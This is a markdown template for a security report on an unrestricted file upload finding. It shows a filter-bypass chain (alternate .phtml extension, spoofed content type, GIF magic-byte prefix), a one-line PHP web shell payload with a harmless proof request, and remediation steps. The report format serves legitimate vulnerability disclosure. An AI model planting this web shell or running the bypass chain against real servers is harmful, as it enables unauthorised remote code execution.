# File Upload / LFI Finding — Report Template

```markdown
## Unrestricted File Upload leading to <execution/stored risk>

**Severity**: High/Critical (CVSS 8.8+ when server-side execution proven;
Medium if storage-only XSS vector)
**Asset**: POST https://target.example.com/api/avatars
**Type**: CWE-434 Unrestricted Upload of File with Dangerous Type

### Bypass chain demonstrated

1. Extension filter blocks `.php` -> `.phtml` accepted.
2. Content-Type validated against image/* -> sent `image/png`.
3. Magic bytes checked -> prepended GIF89a header.
Final file: `GIF89a<?php echo shell_exec($_GET["c"]);?>` saved as
`<uuid>.phtml`.

### Execution proof (non-destructive)

```
GET /uploads/<uuid>.phtml?c=echo+PROOF_$(id+-u)
-> PROOF_33
```
Screenshot: evidence/upload_rce.png. Payload prints user id only; no
reverse shells, no persistence.

### Impact

- Remote code execution under web server user on production host.
- Internal network reachability implied (documented banner-level check).

### Remediation

1. Allowlist extensions AND validate real content type server-side
   (getimagesize/magic lib); re-encode images on ingest (strips tails).
2. Store outside webroot or on non-executing domain/CDN.
3. Randomize names, enforce no-exec handlers at web server level
   (location block denying script exec in uploads dir).
4. Virus-scan async; quarantine until clean.
```
